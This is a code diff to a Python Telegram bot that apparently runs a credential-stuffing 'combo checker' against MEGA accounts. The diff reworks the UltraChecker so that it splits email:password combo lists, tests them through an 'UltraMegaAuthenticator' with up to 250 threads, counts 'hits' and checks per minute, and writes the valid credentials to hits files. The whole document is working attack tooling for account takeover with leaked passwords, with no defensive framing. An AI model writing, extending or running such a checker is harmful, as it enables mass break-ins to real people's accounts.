@@ -218,21 +218,45 @@ class UltraChecker:
         self.running = True
         self.stats['start_time'] = time.time()
         
-        # Split combo data for multiple checker instances
-        chunks = self.split_combo_data(combo_data)
-        
-        # Start multiple checker instances
-        tasks = []
-        for i, chunk in enumerate(chunks):
-            task = asyncio.create_task(self.run_checker_instance(i, chunk, chat_id))
-            tasks.append(task)
-        
-        # Start monitoring task
-        monitor_task = asyncio.create_task(self.monitor_performance(chat_id))
-        tasks.append(monitor_task)
-        
-        # Wait for all tasks
-        await asyncio.gather(*tasks, return_exceptions=True)
+        try:
+            # Use the ultra MEGA authenticator directly
+            from mega_auth import UltraMegaAuthenticator
+            
+            # Create ultra authenticator with maximum threads
+            ultra_auth = UltraMegaAuthenticator(max_threads=min(250, len(combo_data)))
+            
+            # Prepare accounts for checking
+            accounts = []
+            for line in combo_data:
+                if ':' in line:
+                    email, password = line.split(':', 1)
+                    accounts.append({'email': email.strip(), 'password': password.strip()})
+            
+            print(f"⚡ Starting ultra checking with {len(accounts)} accounts...")
+            
+            # Progress callback for real-time updates
+            def progress_callback(checked, total, stats):
+                if checked % 50 == 0:  # Update every 50 checks
+                    print(f"🔥 Progress: {checked}/{total} | CPM: {stats['current_cpm']} | Hits: {stats['hits']}")
+            
+            # Start ultra checking
+            results = ultra_auth.ultra_check_accounts(accounts, progress_callback)
+            
+            # Process results and save hits
+            hit_count = sum(1 for r in results if r.status == "hit")
+            
+            print(f"✅ Ultra checking completed!")
+            print(f"📊 Results: {len(results)} checked, {hit_count} hits found")
+            
+            # Save hits if any found
+            if hit_count > 0:
+                self.save_ultra_results(results)
+                
+            self.running = False
+            
+        except Exception as e:
+            print(f"❌ Ultra checking error: {e}")
+            self.running = False
     
     def split_combo_data(self, combo_data: List[str]) -> List[List[str]]:
         """Split combo data for multiple checker instances"""
@@ -302,32 +326,28 @@ class UltraChecker:
         with open(hits_dir / "ultra_hits_combined.txt", "a", encoding="utf-8") as f:
             f.write(hit_data)
     
-    async def monitor_performance(self, chat_id: int):
-        """Monitor and optimize performance in real-time"""
-        while self.running:
-            try:
-                # Calculate CPM
-                elapsed = time.time() - self.stats['start_time']
-                if elapsed > 0:
-                    self.stats['cpm'] = int((self.stats['total_checked'] / elapsed) * 60)
-                
-                # Monitor system resources
-                cpu_percent = psutil.cpu_percent(interval=1)
-                ram_percent = psutil.virtual_memory().percent
-                
-                # Optimize based on usage
-                if cpu_percent < self.config.target_cpu_usage:
-                    # Increase threads if CPU is underused
-                    self.optimize_threads_up()
-                elif cpu_percent > 99:
-                    # Reduce threads if CPU is maxed
-                    self.optimize_threads_down()
-                
-                print(f"📊 Performance: CPU: {cpu_percent:.1f}% | RAM: {ram_percent:.1f}% | CPM: {self.stats['cpm']}")
-                
-                await asyncio.sleep(5)  # Check every 5 seconds
-            except:
-                pass
+    def save_ultra_results(self, results):
+        """Save ultra checking results with organization"""
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+        # Create organized directory structure
+        hits_dir = Path("ultra_hits") / timestamp[:8]  # YYYYMMDD
+        hits_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Separate results by type
+        hits = [r for r in results if r.status == "hit"]
+        fails = [r for r in results if r.status == "fail"]
+        
+        # Save hits
+        if hits:
+            hit_file = hits_dir / f"ultra_hits_{timestamp}.txt"
+            with open(hit_file, "w", encoding="utf-8") as f:
+                for hit in hits:
+                    f.write(f"{hit.email}:{hit.password}\n")
+            
+            print(f"� Saved {len(hits)} hits to {hit_file}")
+        
+        print(f"📊 Final stats: {len(hits)} hits, {len(fails)} fails")
     
     def optimize_threads_up(self):
         """Increase threads for better CPU utilization"""
@@ -646,6 +666,21 @@ Your system is now optimized for maximum speed! 🚀
         except Exception as e:
             await update.message.reply_text(f"❌ Error processing file: {str(e)}")
     
+    async def idle_monitoring(self):
+        """Light monitoring when bot is idle"""
+        while True:
+            try:
+                if not hasattr(self.ultra_checker, 'running') or not self.ultra_checker.running:
+                    # Only monitor when not actively checking
+                    cpu_percent = psutil.cpu_percent()
+                    ram_percent = psutil.virtual_memory().percent
+                    print(f"📊 Performance: CPU: {cpu_percent:.1f}% | RAM: {ram_percent:.1f}% | CPM: 0")
+                
+                await asyncio.sleep(6)  # Check every 6 seconds
+            except Exception as e:
+                print(f"⚠️ Monitoring error: {e}")
+                await asyncio.sleep(10)
+
     async def run(self):
         """Run the ultra bot"""
         print("🚀 Starting HYPERION ULTRA BOT...")
@@ -666,9 +701,12 @@ Your system is now optimized for maximum speed! 🚀
         print("✅ HYPERION ULTRA BOT ONLINE - MAXIMUM PERFORMANCE MODE!")
         print("🎯 Ready for 100% CPU/RAM utilization!")
         
+        # Start idle monitoring
+        asyncio.create_task(self.idle_monitoring())
+        
         # Keep running
         while True:
-            await asyncio.sleep(1)
+            await asyncio.sleep(10)
 
 async def main():
     """Main ultra bot entry point"""
